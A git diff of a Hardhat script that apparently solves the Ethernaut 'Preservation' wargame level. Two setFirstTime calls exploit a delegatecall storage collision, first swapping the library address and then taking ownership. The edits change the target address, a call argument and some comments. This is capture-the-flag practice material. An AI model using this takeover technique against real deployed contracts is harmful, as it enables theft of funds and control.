@@ -2,7 +2,7 @@ import { ethers } from "hardhat";
 
 async function attackPreservation() {
     // change contract addresses here.
-    const preservationAddress = "0x6a93e425f74d3efAD0f030C1cc00226c2B5f8f6b";
+    const preservationAddress = "0xDe83B4021fD817f3EC437579B583e15b56B427aD";
     // const player = ""; //place your player address here (you may type player in ethernaut console)
     const args: any[] = [];
     const player = process.env.PRIVATE_KEY || "";
@@ -57,12 +57,12 @@ async function attackPreservation() {
     console.log(`setting to ${uint256}`);
     const tx1 = await contract.setFirstTime(uint256);
     const tx1receipt = await tx1.wait(1);
-    // console.log(tx1receipt);
+    // console.log(tx1receipt); //for logging
     console.log("change library done");
     console.log("Change library done!now setting new owner via vulnerability...");
-    const tx2 = await contract.setFirstTime(1);
+    const tx2 = await contract.setFirstTime(8);
     const tx2Receipt = await tx2.wait(1);
-    console.log(tx2Receipt);
+    console.log(tx2Receipt); //for logging
     console.log("change owner done");
     // new implementation
     // const tx1 = await attack.hack(preservationAddress, players.address);
